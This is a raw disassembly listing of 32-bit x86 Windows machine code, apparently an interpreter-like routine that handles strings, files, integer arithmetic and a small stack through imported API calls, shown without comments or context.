  4016d2:	e8 d4 16 00 00       	call   0x402dab
  4016d7:	8b 7d f4             	mov    -0xc(%ebp),%edi
  4016da:	8b f0                	mov    %eax,%esi
  4016dc:	8d 45 08             	lea    0x8(%ebp),%eax
  4016df:	50                   	push   %eax
  4016e0:	57                   	push   %edi
  4016e1:	68 00 04 00 00       	push   $0x400
  4016e6:	56                   	push   %esi
  4016e7:	ff 15 e8 80 40 00    	call   *0x4080e8
  4016ed:	85 c0                	test   %eax,%eax
  4016ef:	74 24                	je     0x401715
  4016f1:	8b 45 08             	mov    0x8(%ebp),%eax
  4016f4:	3b c6                	cmp    %esi,%eax
  4016f6:	76 27                	jbe    0x40171f
  4016f8:	66 39 18             	cmp    %bx,(%eax)
  4016fb:	74 22                	je     0x40171f
  4016fd:	56                   	push   %esi
  4016fe:	e8 dc 52 00 00       	call   0x4069df
  401703:	3b c3                	cmp    %ebx,%eax
  401705:	74 0e                	je     0x401715
  401707:	83 c0 2c             	add    $0x2c,%eax
  40170a:	50                   	push   %eax
  40170b:	ff 75 08             	push   0x8(%ebp)
  40170e:	e8 6f 4f 00 00       	call   0x406682
  401713:	eb 0a                	jmp    0x40171f
  401715:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40171c:	66 89 1f             	mov    %bx,(%edi)
  40171f:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401722:	0f 85 07 15 00 00    	jne    0x402c2f
  401728:	68 00 04 00 00       	push   $0x400
  40172d:	57                   	push   %edi
  40172e:	57                   	push   %edi
  40172f:	ff 15 ec 80 40 00    	call   *0x4080ec
  401735:	e9 f5 14 00 00       	jmp    0x402c2f
  40173a:	6a ff                	push   $0xffffffff
  40173c:	e8 6a 16 00 00       	call   0x402dab
  401741:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401744:	51                   	push   %ecx
  401745:	57                   	push   %edi
  401746:	68 00 04 00 00       	push   $0x400
  40174b:	53                   	push   %ebx
  40174c:	50                   	push   %eax
  40174d:	53                   	push   %ebx
  40174e:	ff 15 f0 80 40 00    	call   *0x4080f0
  401754:	85 c0                	test   %eax,%eax
  401756:	0f 85 d3 14 00 00    	jne    0x402c2f
  40175c:	e9 a0 11 00 00       	jmp    0x402901
  401761:	6a ef                	push   $0xffffffef
  401763:	e8 43 16 00 00       	call   0x402dab
  401768:	50                   	push   %eax
  401769:	57                   	push   %edi
  40176a:	e8 32 4a 00 00       	call   0x4061a1
  40176f:	e9 45 fe ff ff       	jmp    0x4015b9
  401774:	6a 31                	push   $0x31
  401776:	e8 30 16 00 00       	call   0x402dab
  40177b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40177e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401781:	ff 75 f8             	push   -0x8(%ebp)
  401784:	83 e0 07             	and    $0x7,%eax
  401787:	89 45 08             	mov    %eax,0x8(%ebp)
  40178a:	e8 39 48 00 00       	call   0x405fc8
  40178f:	ff 75 f8             	push   -0x8(%ebp)
  401792:	bf f8 a5 40 00       	mov    $0x40a5f8,%edi
  401797:	85 c0                	test   %eax,%eax
  401799:	74 08                	je     0x4017a3
  40179b:	57                   	push   %edi
  40179c:	e8 e1 4e 00 00       	call   0x406682
  4017a1:	eb 17                	jmp    0x4017ba
  4017a3:	68 00 50 43 00       	push   $0x435000
  4017a8:	57                   	push   %edi
  4017a9:	e8 d4 4e 00 00       	call   0x406682
  4017ae:	50                   	push   %eax
  4017af:	e8 9d 47 00 00       	call   0x405f51
  4017b4:	50                   	push   %eax
  4017b5:	e8 e4 4e 00 00       	call   0x40669e
  4017ba:	57                   	push   %edi
  4017bb:	e8 70 51 00 00       	call   0x406930
  4017c0:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017c4:	7c 31                	jl     0x4017f7
  4017c6:	57                   	push   %edi
  4017c7:	e8 13 52 00 00       	call   0x4069df
  4017cc:	33 c9                	xor    %ecx,%ecx
  4017ce:	3b c3                	cmp    %ebx,%eax
  4017d0:	74 10                	je     0x4017e2
  4017d2:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4017d5:	83 c0 14             	add    $0x14,%eax
  4017d8:	51                   	push   %ecx
  4017d9:	50                   	push   %eax
  4017da:	ff 15 f4 80 40 00    	call   *0x4080f4
  4017e0:	8b c8                	mov    %eax,%ecx
  4017e2:	8b 45 08             	mov    0x8(%ebp),%eax
  4017e5:	83 c0 fd             	add    $0xfffffffd,%eax
  4017e8:	0d 00 00 00 80       	or     $0x80000000,%eax
  4017ed:	23 c1                	and    %ecx,%eax
  4017ef:	f7 d8                	neg    %eax
  4017f1:	1b c0                	sbb    %eax,%eax
  4017f3:	40                   	inc    %eax
  4017f4:	89 45 08             	mov    %eax,0x8(%ebp)
  4017f7:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017fa:	75 06                	jne    0x401802
  4017fc:	57                   	push   %edi
  4017fd:	e8 4b 49 00 00       	call   0x40614d
  401802:	33 c0                	xor    %eax,%eax
  401804:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  401808:	0f 95 c0             	setne  %al
  40180b:	40                   	inc    %eax
  40180c:	50                   	push   %eax
  40180d:	68 00 00 00 40       	push   $0x40000000
  401812:	57                   	push   %edi
  401813:	e8 5a 49 00 00       	call   0x406172
  401818:	83 f8 ff             	cmp    $0xffffffff,%eax
  40181b:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40181e:	75 72                	jne    0x401892
  401820:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401823:	75 4f                	jne    0x401874
  401825:	56                   	push   %esi
  401826:	68 f8 b5 40 00       	push   $0x40b5f8
  40182b:	e8 52 4e 00 00       	call   0x406682
  401830:	57                   	push   %edi
  401831:	56                   	push   %esi
  401832:	e8 4b 4e 00 00       	call   0x406682
  401837:	ff 75 e4             	push   -0x1c(%ebp)
  40183a:	68 f8 ad 40 00       	push   $0x40adf8
  40183f:	e8 7b 4e 00 00       	call   0x4066bf
  401844:	68 f8 b5 40 00       	push   $0x40b5f8
  401849:	56                   	push   %esi
  40184a:	e8 33 4e 00 00       	call   0x406682
  40184f:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401852:	c1 f8 03             	sar    $0x3,%eax
  401855:	50                   	push   %eax
  401856:	68 f8 ad 40 00       	push   $0x40adf8
  40185b:	e8 82 44 00 00       	call   0x405ce2
  401860:	83 e8 04             	sub    $0x4,%eax
  401863:	0f 84 57 ff ff ff    	je     0x4017c0
  401869:	48                   	dec    %eax
  40186a:	74 1b                	je     0x401887
  40186c:	57                   	push   %edi
  40186d:	6a fa                	push   $0xfffffffa
  40186f:	e9 1f fc ff ff       	jmp    0x401493
  401874:	ff 75 f8             	push   -0x8(%ebp)
  401877:	6a e2                	push   $0xffffffe2
  401879:	e8 89 3e 00 00       	call   0x405707
  40187e:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  401882:	e9 34 fd ff ff       	jmp    0x4015bb
  401887:	ff 05 e8 9a 42 00    	incl   0x429ae8
  40188d:	e9 a6 13 00 00       	jmp    0x402c38
  401892:	ff 75 f8             	push   -0x8(%ebp)
  401895:	6a ea                	push   $0xffffffea
  401897:	e8 6b 3e 00 00       	call   0x405707
  40189c:	ff 05 14 9b 42 00    	incl   0x429b14
  4018a2:	53                   	push   %ebx
  4018a3:	53                   	push   %ebx
  4018a4:	ff 75 c8             	push   -0x38(%ebp)
  4018a7:	ff 75 d8             	push   -0x28(%ebp)
  4018aa:	e8 c7 1a 00 00       	call   0x403376
  4018af:	ff 0d 14 9b 42 00    	decl   0x429b14
  4018b5:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%ebp)
  4018b9:	8b f0                	mov    %eax,%esi
  4018bb:	75 06                	jne    0x4018c3
  4018bd:	83 7d e0 ff          	cmpl   $0xffffffff,-0x20(%ebp)
  4018c1:	74 12                	je     0x4018d5
  4018c3:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018c6:	50                   	push   %eax
  4018c7:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018ca:	53                   	push   %ebx
  4018cb:	50                   	push   %eax
  4018cc:	ff 75 c8             	push   -0x38(%ebp)
  4018cf:	ff 15 f8 80 40 00    	call   *0x4080f8
  4018d5:	ff 75 c8             	push   -0x38(%ebp)
  4018d8:	ff 15 fc 80 40 00    	call   *0x4080fc
  4018de:	3b f3                	cmp    %ebx,%esi
  4018e0:	0f 8d 49 13 00 00    	jge    0x402c2f
  4018e6:	83 fe fe             	cmp    $0xfffffffe,%esi
  4018e9:	75 13                	jne    0x4018fe
  4018eb:	6a e9                	push   $0xffffffe9
  4018ed:	57                   	push   %edi
  4018ee:	e8 cc 4d 00 00       	call   0x4066bf
  4018f3:	ff 75 f8             	push   -0x8(%ebp)
  4018f6:	57                   	push   %edi
  4018f7:	e8 a2 4d 00 00       	call   0x40669e
  4018fc:	eb 08                	jmp    0x401906
  4018fe:	6a ee                	push   $0xffffffee
  401900:	57                   	push   %edi
  401901:	e8 b9 4d 00 00       	call   0x4066bf
  401906:	68 10 00 20 00       	push   $0x200010
  40190b:	57                   	push   %edi
  40190c:	e9 8c 0a 00 00       	jmp    0x40239d
  401911:	53                   	push   %ebx
  401912:	eb 34                	jmp    0x401948
  401914:	6a 31                	push   $0x31
  401916:	e8 90 14 00 00       	call   0x402dab
  40191b:	ff 75 d0             	push   -0x30(%ebp)
  40191e:	50                   	push   %eax
  40191f:	e8 be 43 00 00       	call   0x405ce2
  401924:	3b c3                	cmp    %ebx,%eax
  401926:	0f 84 07 10 00 00    	je     0x402933
  40192c:	3b 45 d8             	cmp    -0x28(%ebp),%eax
  40192f:	0f 84 6c 01 00 00    	je     0x401aa1
  401935:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  401938:	0f 85 f1 12 00 00    	jne    0x402c2f
  40193e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401941:	e9 f4 12 00 00       	jmp    0x402c3a
  401946:	6a f0                	push   $0xfffffff0
  401948:	e8 5e 14 00 00       	call   0x402dab
  40194d:	ff 75 d4             	push   -0x2c(%ebp)
  401950:	50                   	push   %eax
  401951:	e8 38 44 00 00       	call   0x405d8e
  401956:	e9 d4 12 00 00       	jmp    0x402c2f
  40195b:	6a 01                	push   $0x1
  40195d:	e8 49 14 00 00       	call   0x402dab
  401962:	50                   	push   %eax
  401963:	e8 30 4d 00 00       	call   0x406698
  401968:	e9 d0 0c 00 00       	jmp    0x40263d
  40196d:	6a 02                	push   $0x2
  40196f:	e8 15 14 00 00       	call   0x402d89
  401974:	6a 03                	push   $0x3
  401976:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401979:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40197c:	e8 08 14 00 00       	call   0x402d89
  401981:	59                   	pop    %ecx
  401982:	8b f0                	mov    %eax,%esi
  401984:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401987:	59                   	pop    %ecx
  401988:	6a 01                	push   $0x1
  40198a:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  40198d:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401990:	89 45 08             	mov    %eax,0x8(%ebp)
  401993:	e8 13 14 00 00       	call   0x402dab
  401998:	50                   	push   %eax
  401999:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40199c:	e8 f7 4c 00 00       	call   0x406698
  4019a1:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  4019a4:	66 89 1f             	mov    %bx,(%edi)
  4019a7:	75 03                	jne    0x4019ac
  4019a9:	89 45 08             	mov    %eax,0x8(%ebp)
  4019ac:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019af:	0f 84 7a 12 00 00    	je     0x402c2f
  4019b5:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4019b8:	3b cb                	cmp    %ebx,%ecx
  4019ba:	7d 0b                	jge    0x4019c7
  4019bc:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  4019bf:	3b f3                	cmp    %ebx,%esi
  4019c1:	0f 8c 68 12 00 00    	jl     0x402c2f
  4019c7:	3b f0                	cmp    %eax,%esi
  4019c9:	7e 02                	jle    0x4019cd
  4019cb:	8b f0                	mov    %eax,%esi
  4019cd:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4019d0:	8d 04 70             	lea    (%eax,%esi,2),%eax
  4019d3:	50                   	push   %eax
  4019d4:	57                   	push   %edi
  4019d5:	e8 a8 4c 00 00       	call   0x406682
  4019da:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019dd:	7d 0e                	jge    0x4019ed
  4019df:	57                   	push   %edi
  4019e0:	e8 b3 4c 00 00       	call   0x406698
  4019e5:	01 45 08             	add    %eax,0x8(%ebp)
  4019e8:	79 03                	jns    0x4019ed
  4019ea:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4019ed:	8b 45 08             	mov    0x8(%ebp),%eax
  4019f0:	3d 00 04 00 00       	cmp    $0x400,%eax
  4019f5:	0f 8d 34 12 00 00    	jge    0x402c2f
  4019fb:	66 89 1c 47          	mov    %bx,(%edi,%eax,2)
  4019ff:	e9 2b 12 00 00       	jmp    0x402c2f
  401a04:	6a 20                	push   $0x20
  401a06:	e8 a0 13 00 00       	call   0x402dab
  401a0b:	6a 31                	push   $0x31
  401a0d:	8b f0                	mov    %eax,%esi
  401a0f:	e8 97 13 00 00       	call   0x402dab
  401a14:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401a17:	50                   	push   %eax
  401a18:	56                   	push   %esi
  401a19:	75 12                	jne    0x401a2d
  401a1b:	ff 15 00 81 40 00    	call   *0x408100
  401a21:	85 c0                	test   %eax,%eax
  401a23:	75 7c                	jne    0x401aa1
  401a25:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401a28:	e9 0d 12 00 00       	jmp    0x402c3a
  401a2d:	ff 15 04 81 40 00    	call   *0x408104
  401a33:	eb ec                	jmp    0x401a21
  401a35:	33 f6                	xor    %esi,%esi
  401a37:	46                   	inc    %esi
  401a38:	56                   	push   %esi
  401a39:	e8 6d 13 00 00       	call   0x402dab
  401a3e:	68 00 04 00 00       	push   $0x400
  401a43:	57                   	push   %edi
  401a44:	50                   	push   %eax
  401a45:	89 45 08             	mov    %eax,0x8(%ebp)
  401a48:	ff 15 08 81 40 00    	call   *0x408108
  401a4e:	85 c0                	test   %eax,%eax
  401a50:	74 13                	je     0x401a65
  401a52:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401a55:	74 14                	je     0x401a6b
  401a57:	57                   	push   %edi
  401a58:	ff 75 08             	push   0x8(%ebp)
  401a5b:	ff 15 04 81 40 00    	call   *0x408104
  401a61:	85 c0                	test   %eax,%eax
  401a63:	75 06                	jne    0x401a6b
  401a65:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401a68:	66 89 1f             	mov    %bx,(%edi)
  401a6b:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  401a72:	e9 b8 11 00 00       	jmp    0x402c2f
  401a77:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  401a7a:	53                   	push   %ebx
  401a7b:	e8 09 13 00 00       	call   0x402d89
  401a80:	6a 01                	push   $0x1
  401a82:	8b f8                	mov    %eax,%edi
  401a84:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401a87:	e8 fd 12 00 00       	call   0x402d89
  401a8c:	59                   	pop    %ecx
  401a8d:	3b f3                	cmp    %ebx,%esi
  401a8f:	59                   	pop    %ecx
  401a90:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401a93:	75 08                	jne    0x401a9d
  401a95:	3b f8                	cmp    %eax,%edi
  401a97:	7c 08                	jl     0x401aa1
  401a99:	7e 8a                	jle    0x401a25
  401a9b:	eb 12                	jmp    0x401aaf
  401a9d:	3b f8                	cmp    %eax,%edi
  401a9f:	73 08                	jae    0x401aa9
  401aa1:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401aa4:	e9 91 11 00 00       	jmp    0x402c3a
  401aa9:	0f 86 76 ff ff ff    	jbe    0x401a25
  401aaf:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401ab2:	e9 83 11 00 00       	jmp    0x402c3a
  401ab7:	6a 01                	push   $0x1
  401ab9:	e8 cb 12 00 00       	call   0x402d89
  401abe:	8b f0                	mov    %eax,%esi
  401ac0:	6a 02                	push   $0x2
  401ac2:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ac5:	89 75 08             	mov    %esi,0x8(%ebp)
  401ac8:	e8 bc 12 00 00       	call   0x402d89
  401acd:	59                   	pop    %ecx
  401ace:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ad1:	59                   	pop    %ecx
  401ad2:	8b c8                	mov    %eax,%ecx
  401ad4:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401ad7:	83 f8 0d             	cmp    $0xd,%eax
  401ada:	0f 87 94 00 00 00    	ja     0x401b74
  401ae0:	ff 24 85 51 2d 40 00 	jmp    *0x402d51(,%eax,4)
  401ae7:	03 f1                	add    %ecx,%esi
  401ae9:	e9 5f 03 00 00       	jmp    0x401e4d
  401aee:	2b f1                	sub    %ecx,%esi
  401af0:	e9 58 03 00 00       	jmp    0x401e4d
  401af5:	0f af ce             	imul   %esi,%ecx
  401af8:	eb 1a                	jmp    0x401b14
  401afa:	3b cb                	cmp    %ebx,%ecx
  401afc:	74 53                	je     0x401b51
  401afe:	8b c6                	mov    %esi,%eax
  401b00:	99                   	cltd
  401b01:	f7 f9                	idiv   %ecx
  401b03:	8b f0                	mov    %eax,%esi
  401b05:	e9 43 03 00 00       	jmp    0x401e4d
  401b0a:	0b ce                	or     %esi,%ecx
  401b0c:	eb 06                	jmp    0x401b14
  401b0e:	23 ce                	and    %esi,%ecx
  401b10:	eb 02                	jmp    0x401b14
  401b12:	33 ce                	xor    %esi,%ecx
  401b14:	8b f1                	mov    %ecx,%esi
  401b16:	e9 32 03 00 00       	jmp    0x401e4d
  401b1b:	33 c0                	xor    %eax,%eax
  401b1d:	3b f3                	cmp    %ebx,%esi
  401b1f:	0f 94 c0             	sete   %al
  401b22:	eb df                	jmp    0x401b03
  401b24:	3b f3                	cmp    %ebx,%esi
  401b26:	75 11                	jne    0x401b39
  401b28:	eb 0b                	jmp    0x401b35
  401b2a:	33 f6                	xor    %esi,%esi
  401b2c:	e9 1c 03 00 00       	jmp    0x401e4d
  401b31:	3b f3                	cmp    %ebx,%esi
  401b33:	74 f5                	je     0x401b2a
  401b35:	3b cb                	cmp    %ebx,%ecx
  401b37:	74 f1                	je     0x401b2a
  401b39:	33 f6                	xor    %esi,%esi
  401b3b:	46                   	inc    %esi
  401b3c:	e9 0c 03 00 00       	jmp    0x401e4d
  401b41:	3b cb                	cmp    %ebx,%ecx
  401b43:	74 0c                	je     0x401b51
  401b45:	8b c6                	mov    %esi,%eax
  401b47:	99                   	cltd
  401b48:	f7 f9                	idiv   %ecx
  401b4a:	8b f2                	mov    %edx,%esi
  401b4c:	e9 fc 02 00 00       	jmp    0x401e4d
  401b51:	33 f6                	xor    %esi,%esi
  401b53:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b5a:	e9 ee 02 00 00       	jmp    0x401e4d
  401b5f:	d3 e6                	shl    %cl,%esi
  401b61:	e9 e7 02 00 00       	jmp    0x401e4d
  401b66:	d3 fe                	sar    %cl,%esi
  401b68:	e9 e0 02 00 00       	jmp    0x401e4d
  401b6d:	d3 ee                	shr    %cl,%esi
  401b6f:	e9 d9 02 00 00       	jmp    0x401e4d
  401b74:	8b 75 08             	mov    0x8(%ebp),%esi
  401b77:	e9 d1 02 00 00       	jmp    0x401e4d
  401b7c:	6a 01                	push   $0x1
  401b7e:	e8 28 12 00 00       	call   0x402dab
  401b83:	6a 02                	push   $0x2
  401b85:	8b f0                	mov    %eax,%esi
  401b87:	e8 fd 11 00 00       	call   0x402d89
  401b8c:	50                   	push   %eax
  401b8d:	56                   	push   %esi
  401b8e:	57                   	push   %edi
  401b8f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401b92:	ff 15 2c 82 40 00    	call   *0x40822c
  401b98:	83 c4 10             	add    $0x10,%esp
  401b9b:	e9 8f 10 00 00       	jmp    0x402c2f
  401ba0:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401ba3:	8b 35 58 ce 40 00    	mov    0x40ce58,%esi
  401ba9:	3b c3                	cmp    %ebx,%eax
  401bab:	74 44                	je     0x401bf1
  401bad:	48                   	dec    %eax
  401bae:	3b f3                	cmp    %ebx,%esi
  401bb0:	0f 84 d9 07 00 00    	je     0x40238f
  401bb6:	8b 36                	mov    (%esi),%esi
  401bb8:	3b c3                	cmp    %ebx,%eax
  401bba:	75 f1                	jne    0x401bad
  401bbc:	3b f3                	cmp    %ebx,%esi
  401bbe:	0f 84 cb 07 00 00    	je     0x40238f
  401bc4:	83 c6 04             	add    $0x4,%esi
  401bc7:	bf f8 a5 40 00       	mov    $0x40a5f8,%edi
  401bcc:	56                   	push   %esi
  401bcd:	57                   	push   %edi
  401bce:	e8 af 4a 00 00       	call   0x406682
  401bd3:	a1 58 ce 40 00       	mov    0x40ce58,%eax
  401bd8:	83 c0 04             	add    $0x4,%eax
  401bdb:	50                   	push   %eax
  401bdc:	56                   	push   %esi
  401bdd:	e8 a0 4a 00 00       	call   0x406682
  401be2:	a1 58 ce 40 00       	mov    0x40ce58,%eax
  401be7:	57                   	push   %edi
  401be8:	83 c0 04             	add    $0x4,%eax
  401beb:	50                   	push   %eax
  401bec:	e9 a8 0e 00 00       	jmp    0x402a99
  401bf1:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401bf4:	74 25                	je     0x401c1b
  401bf6:	3b f3                	cmp    %ebx,%esi
  401bf8:	0f 84 35 0d 00 00    	je     0x402933
  401bfe:	8d 46 04             	lea    0x4(%esi),%eax
  401c01:	50                   	push   %eax
  401c02:	57                   	push   %edi
  401c03:	e8 7a 4a 00 00       	call   0x406682
  401c08:	8b 06                	mov    (%esi),%eax
  401c0a:	56                   	push   %esi
  401c0b:	a3 58 ce 40 00       	mov    %eax,0x40ce58
  401c10:	ff 15 0c 81 40 00    	call   *0x40810c
  401c16:	e9 14 10 00 00       	jmp    0x402c2f
  401c1b:	68 04 08 00 00       	push   $0x804
  401c20:	6a 40                	push   $0x40
  401c22:	ff 15 10 81 40 00    	call   *0x408110
  401c28:	ff 75 d0             	push   -0x30(%ebp)
  401c2b:	8b f0                	mov    %eax,%esi
  401c2d:	8d 46 04             	lea    0x4(%esi),%eax
  401c30:	50                   	push   %eax
  401c31:	e8 89 4a 00 00       	call   0x4066bf
  401c36:	a1 58 ce 40 00       	mov    0x40ce58,%eax
  401c3b:	89 06                	mov    %eax,(%esi)
  401c3d:	89 35 58 ce 40 00    	mov    %esi,0x40ce58
  401c43:	e9 e7 0f 00 00       	jmp    0x402c2f
  401c48:	6a 03                	push   $0x3
  401c4a:	e8 3a 11 00 00       	call   0x402d89
  401c4f:	6a 04                	push   $0x4
  401c51:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c54:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c57:	e8 2d 11 00 00       	call   0x402d89
  401c5c:	f6 45 e4 01          	testb  $0x1,-0x1c(%ebp)
  401c60:	59                   	pop    %ecx
  401c61:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c64:	59                   	pop    %ecx
  401c65:	89 45 08             	mov    %eax,0x8(%ebp)
  401c68:	74 0a                	je     0x401c74
  401c6a:	6a 33                	push   $0x33
  401c6c:	e8 3a 11 00 00       	call   0x402dab
  401c71:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c74:	f6 45 e4 02          	testb  $0x2,-0x1c(%ebp)
  401c78:	74 0a                	je     0x401c84
  401c7a:	6a 44                	push   $0x44
  401c7c:	e8 2a 11 00 00       	call   0x402dab
  401c81:	89 45 08             	mov    %eax,0x8(%ebp)
  401c84:	83 7d cc 21          	cmpl   $0x21,-0x34(%ebp)
  401c88:	6a 01                	push   $0x1
  401c8a:	75 4c                	jne    0x401cd8
  401c8c:	e8 f8 10 00 00       	call   0x402d89
  401c91:	6a 02                	push   $0x2
  401c93:	8b f0                	mov    %eax,%esi
  401c95:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c98:	e8 ec 10 00 00       	call   0x402d89
  401c9d:	59                   	pop    %ecx
  401c9e:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ca1:	59                   	pop    %ecx
  401ca2:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401ca5:	c1 f9 02             	sar    $0x2,%ecx
  401ca8:	74 1e                	je     0x401cc8
  401caa:	8d 55 c8             	lea    -0x38(%ebp),%edx
  401cad:	52                   	push   %edx
  401cae:	51                   	push   %ecx
  401caf:	53                   	push   %ebx
  401cb0:	ff 75 08             	push   0x8(%ebp)
  401cb3:	ff 75 e8             	push   -0x18(%ebp)
  401cb6:	50                   	push   %eax
  401cb7:	56                   	push   %esi
  401cb8:	ff 15 30 82 40 00    	call   *0x408230
  401cbe:	f7 d8                	neg    %eax
  401cc0:	1b c0                	sbb    %eax,%eax
  401cc2:	40                   	inc    %eax
  401cc3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401cc6:	eb 43                	jmp    0x401d0b
  401cc8:	ff 75 08             	push   0x8(%ebp)
  401ccb:	ff 75 e8             	push   -0x18(%ebp)
  401cce:	50                   	push   %eax
  401ccf:	56                   	push   %esi
  401cd0:	ff 15 58 82 40 00    	call   *0x408258
  401cd6:	eb 30                	jmp    0x401d08
  401cd8:	e8 ce 10 00 00       	call   0x402dab
  401cdd:	6a 12                	push   $0x12
  401cdf:	8b f0                	mov    %eax,%esi
  401ce1:	e8 c5 10 00 00       	call   0x402dab
  401ce6:	66 8b 08             	mov    (%eax),%cx
  401ce9:	66 f7 d9             	neg    %cx
  401cec:	1b c9                	sbb    %ecx,%ecx
  401cee:	23 c8                	and    %eax,%ecx
  401cf0:	66 8b 06             	mov    (%esi),%ax
  401cf3:	66 f7 d8             	neg    %ax
  401cf6:	1b c0                	sbb    %eax,%eax
  401cf8:	51                   	push   %ecx
  401cf9:	23 c6                	and    %esi,%eax
  401cfb:	50                   	push   %eax
  401cfc:	ff 75 08             	push   0x8(%ebp)
  401cff:	ff 75 e8             	push   -0x18(%ebp)
  401d02:	ff 15 34 82 40 00    	call   *0x408234
  401d08:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401d0b:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401d0e:	0f 8c 1b 0f 00 00    	jl     0x402c2f
  401d14:	ff 75 c8             	push   -0x38(%ebp)
  401d17:	e9 56 f8 ff ff       	jmp    0x401572
  401d1c:	53                   	push   %ebx
  401d1d:	e8 67 10 00 00       	call   0x402d89
  401d22:	59                   	pop    %ecx
  401d23:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d26:	50                   	push   %eax
  401d27:	ff 15 38 82 40 00    	call   *0x408238
  401d2d:	85 c0                	test   %eax,%eax
  401d2f:	0f 84 f0 fc ff ff    	je     0x401a25
  401d35:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401d38:	e9 fd 0e 00 00       	jmp    0x402c3a
  401d3d:	6a 02                	push   $0x2
  401d3f:	e8 45 10 00 00       	call   0x402d89
  401d44:	6a 01                	push   $0x1
  401d46:	8b f0                	mov    %eax,%esi
  401d48:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d4b:	e8 39 10 00 00       	call   0x402d89
  401d50:	59                   	pop    %ecx
  401d51:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d54:	59                   	pop    %ecx
  401d55:	56                   	push   %esi
  401d56:	50                   	push   %eax
  401d57:	ff 15 3c 82 40 00    	call   *0x40823c
  401d5d:	e9 db 08 00 00       	jmp    0x40263d
  401d62:	a1 a8 9a 42 00       	mov    0x429aa8,%eax
  401d67:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401d6a:	53                   	push   %ebx
  401d6b:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  401d6e:	e8 16 10 00 00       	call   0x402d89
  401d73:	59                   	pop    %ecx
  401d74:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d77:	56                   	push   %esi
  401d78:	6a eb                	push   $0xffffffeb
  401d7a:	50                   	push   %eax
  401d7b:	ff 15 40 82 40 00    	call   *0x408240
  401d81:	e9 a9 0e 00 00       	jmp    0x402c2f
  401d86:	f6 45 dd 01          	testb  $0x1,-0x23(%ebp)
  401d8a:	74 0d                	je     0x401d99
  401d8c:	6a 02                	push   $0x2
  401d8e:	e8 f6 0f 00 00       	call   0x402d89
  401d93:	59                   	pop    %ecx
  401d94:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d97:	eb 0c                	jmp    0x401da5
  401d99:	ff 75 d8             	push   -0x28(%ebp)
  401d9c:	ff 75 f8             	push   -0x8(%ebp)
  401d9f:	ff 15 3c 82 40 00    	call   *0x40823c
  401da5:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401da8:	89 45 08             	mov    %eax,0x8(%ebp)
  401dab:	8b c1                	mov    %ecx,%eax
  401dad:	8b f1                	mov    %ecx,%esi
  401daf:	83 e0 03             	and    $0x3,%eax
  401db2:	83 e6 04             	and    $0x4,%esi
  401db5:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401db8:	8b c1                	mov    %ecx,%eax
  401dba:	c1 e8 1f             	shr    $0x1f,%eax
  401dbd:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401dc0:	8b c1                	mov    %ecx,%eax
  401dc2:	c1 e8 1e             	shr    $0x1e,%eax
  401dc5:	83 e0 01             	and    $0x1,%eax
  401dc8:	f7 c1 00 00 01 00    	test   $0x10000,%ecx
